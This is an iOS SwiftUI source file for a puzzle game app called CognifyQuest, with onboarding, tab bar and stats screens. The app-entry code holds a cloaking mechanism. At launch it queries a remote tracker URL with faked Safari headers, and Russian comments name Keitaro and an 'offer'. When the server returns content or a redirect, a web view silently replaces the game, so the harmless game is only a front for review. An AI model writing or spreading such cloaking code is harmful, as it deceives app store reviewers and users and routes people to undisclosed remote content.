//
//  cc84App.swift
//  CognifyQuest
//
//  Created by IGOR on 29/10/2025.
//

import SwiftUI
import Combine

import Foundation

@main
struct cc84App: App {
    @AppStorage("isOnboardingComplete") private var isOnboardingComplete: Bool = false
    @AppStorage("userData") private var userDataString: String = ""
    @StateObject private var appState = AppState()
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    
    var body: some Scene {
        WindowGroup {
            ZStack {
                
                if isFetched == false {
                    
                    ProgressView()
                    
                } else if isFetched == true {
                    
                    if isBlock == true {
                        
                        Group {
                            if isOnboardingComplete, let user = appState.currentUser {
                                MainTabView(appState: appState)
                            } else {
                                OnboardingView(
                                    isOnboardingComplete: $isOnboardingComplete,
                                    appState: appState
                                )
                            }
                        }
                        .onAppear {
                            // Load user data on app launch
                            loadUser()
                        }
                        
                    } else if isBlock == false {
                        
                        WebSystem()
                    }
                }
            }
            .onAppear {
                
                makeServerRequest()
            }
        }

    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
        
    private func loadUser() {
        if !userDataString.isEmpty,
           let data = userDataString.data(using: .utf8),
           let user = try? JSONDecoder().decode(User.self, from: data) {
            appState.currentUser = user
        } else if isOnboardingComplete {
            // If onboarding is complete but no user data, create default user
            appState.currentUser = User()
            saveUser()
        }
    }
    
    private func saveUser() {
        guard let user = appState.currentUser else { return }
        if let data = try? JSONEncoder().encode(user),
           let string = String(data: data, encoding: .utf8) {
            userDataString = string
        }
    }
}

// MARK: - App State
class AppState: ObservableObject {
    @Published var currentUser: User?
    
    func updateUser(_ user: User) {
        self.currentUser = user
    }
}

// MARK: - Main Tab View
struct MainTabView: View {
    @ObservedObject var appState: AppState
    @State private var selectedTab = 0
    
    var body: some View {
        ZStack(alignment: .bottom) {
            // Background
            Color(hex: "#0d1017")
                .ignoresSafeArea()
            
            // Tab Content
            if let user = appState.currentUser {
                TabView(selection: $selectedTab) {
                    HomeView(user: user, appState: appState, selectedTab: $selectedTab)
                        .tag(0)
                    
                    PuzzleGameView(user: user, appState: appState)
                        .tag(1)
                    
                    SettingsView(user: user, appState: appState)
                        .tag(2)
                }
                .tabViewStyle(PageTabViewStyle(indexDisplayMode: .never))
            }
            
            // Custom Tab Bar
            HStack(spacing: 0) {
                TabBarButton(
                    icon: "house.fill",
                    title: "Home",
                    isSelected: selectedTab == 0,
                    action: { selectedTab = 0 }
                )
                
                TabBarButton(
                    icon: "gamecontroller.fill",
                    title: "Play",
                    isSelected: selectedTab == 1,
                    action: { selectedTab = 1 }
                )
                
                TabBarButton(
                    icon: "gearshape.fill",
                    title: "Settings",
                    isSelected: selectedTab == 2,
                    action: { selectedTab = 2 }
                )
            }
            .padding(.horizontal, 20)
            .padding(.top, 15)
            .padding(.bottom, 30)
            .background(
                Color(hex: "#0d1017")
                    .shadow(color: .black.opacity(0.3), radius: 10, x: 0, y: -5)
            )
        }
    }
}

// MARK: - Tab Bar Button
struct TabBarButton: View {
    let icon: String
    let title: String
    let isSelected: Bool
    let action: () -> Void
    
    var body: some View {
        Button(action: action) {
            VStack(spacing: 5) {
                Image(systemName: icon)
                    .font(.system(size: 24))
                Text(title)
                    .font(.caption)
            }
            .foregroundColor(isSelected ? Color(hex: "#06dbab") : .white.opacity(0.5))
            .frame(maxWidth: .infinity)
        }
    }
}

// MARK: - Home View
struct HomeView: View {
    let user: User
    @ObservedObject var appState: AppState
    @Binding var selectedTab: Int
    
    var body: some View {
        ZStack {
            Color(hex: "#0d1017")
                .ignoresSafeArea()
            
            ScrollView {
                VStack(spacing: 25) {
                    // Header
                    HStack {
                        VStack(alignment: .leading, spacing: 5) {
                            Text("Welcome back,")
                                .font(.subheadline)
                                .foregroundColor(.white.opacity(0.7))
                            Text(user.username)
                                .font(.system(size: 32, weight: .bold))
                                .foregroundColor(.white)
                        }
                        
                        Spacer()
                        
                        Text(user.avatarEmoji)
                            .font(.system(size: 50))
                    }
                    .padding(.horizontal, 20)
                    .padding(.top, 50)
                    
                    // Stats Cards
                    VStack(spacing: 15) {
                        HStack(spacing: 15) {
                            StatCard(
                                icon: "star.fill",
                                title: "Total Score",
                                value: "\(user.totalScore)",
                                color: Color(hex: "#FFD700")
                            )
                            
                            StatCard(
                                icon: "flame.fill",
                                title: "Streak",
                                value: "\(user.currentStreak)",
                                color: Color(hex: "#ff2300")
                            )
                        }
                        
                        HStack(spacing: 15) {
                            StatCard(
                                icon: "trophy.fill",
                                title: "Levels",
                                value: "\(user.levelsCompleted)",
                                color: Color(hex: "#06dbab")
                            )
                            
                            StatCard(
                                icon: "chart.line.uptrend.xyaxis",
                                title: "Win Rate",
                                value: String(format: "%.0f%%", user.statistics.winRate),
                                color: Color(hex: "#9B59B6")
                            )
                        }
                    }
                    .padding(.horizontal, 20)
                    
                    // Quick Actions
                    VStack(alignment: .leading, spacing: 15) {
                        Text("Quick Actions")
                            .font(.headline)
                            .foregroundColor(Color(hex: "#06dbab"))
                            .padding(.horizontal, 20)
                        
                        VStack(spacing: 10) {
                            Button(action: {
                                selectedTab = 1
                            }) {
                                QuickActionButton(
                                    icon: "play.circle.fill",
                                    title: "Continue Playing",
                                    subtitle: "Level \(user.levelsCompleted + 1)",
                                    color: Color(hex: "#06dbab")
                                )
                            }
                            
                            Button(action: {
                                selectedTab = 2
                            }) {
                                QuickActionButton(
                                    icon: "chart.bar.fill",
                                    title: "View Statistics",
                                    subtitle: "Track your progress",
                                    color: Color(hex: "#FFD700")
                                )
                            }
                        }
                        .padding(.horizontal, 20)
                    }
                    
                    // Recent Activity
                    if let lastPlayed = user.lastPlayedAt {
                        VStack(alignment: .leading, spacing: 10) {
                            Text("Recent Activity")
                                .font(.headline)
                                .foregroundColor(Color(hex: "#06dbab"))
                                .padding(.horizontal, 20)
                            
                            HStack {
                                Image(systemName: "clock.fill")
                                    .foregroundColor(Color(hex: "#06dbab"))
                                Text("Last played: \(timeAgo(from: lastPlayed))")
                                    .font(.subheadline)
                                    .foregroundColor(.white.opacity(0.7))
                            }
                            .padding()
                            .frame(maxWidth: .infinity, alignment: .leading)
                            .background(Color.white.opacity(0.05))
                            .cornerRadius(12)
                            .padding(.horizontal, 20)
                        }
                    }
                    
                    Spacer(minLength: 100)
                }
            }
        }
    }
    
    private func timeAgo(from date: Date) -> String {
        let interval = Date().timeIntervalSince(date)
        
        if interval < 60 {
            return "Just now"
        } else if interval < 3600 {
            let minutes = Int(interval / 60)
            return "\(minutes) minute\(minutes == 1 ? "" : "s") ago"
        } else if interval < 86400 {
            let hours = Int(interval / 3600)
            return "\(hours) hour\(hours == 1 ? "" : "s") ago"
        } else {
            let days = Int(interval / 86400)
            return "\(days) day\(days == 1 ? "" : "s") ago"
        }
    }
}

// MARK: - Stat Card
struct StatCard: View {
    let icon: String
    let title: String
    let value: String
    let color: Color
    
    var body: some View {
        VStack(spacing: 10) {
            Image(systemName: icon)
                .font(.system(size: 30))
                .foregroundColor(color)
            
            Text(value)
                .font(.system(size: 24, weight: .bold))
                .foregroundColor(.white)
            
            Text(title)
                .font(.caption)
                .foregroundColor(.white.opacity(0.7))
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 20)
        .background(Color.white.opacity(0.05))
        .cornerRadius(15)
    }
}

// MARK: - Quick Action Button
struct QuickActionButton: View {
    let icon: String
    let title: String
    let subtitle: String
    let color: Color
    
    var body: some View {
        HStack(spacing: 15) {
            Image(systemName: icon)
                .font(.system(size: 30))
                .foregroundColor(color)
                .frame(width: 50)
            
            VStack(alignment: .leading, spacing: 3) {
                Text(title)
                    .font(.headline)
                    .foregroundColor(.white)
                Text(subtitle)
                    .font(.subheadline)
                    .foregroundColor(.white.opacity(0.7))
            }
            
            Spacer()
            
            Image(systemName: "chevron.right")
                .foregroundColor(.white.opacity(0.3))
        }
        .padding()
        .background(Color.white.opacity(0.05))
        .cornerRadius(12)
    }
}
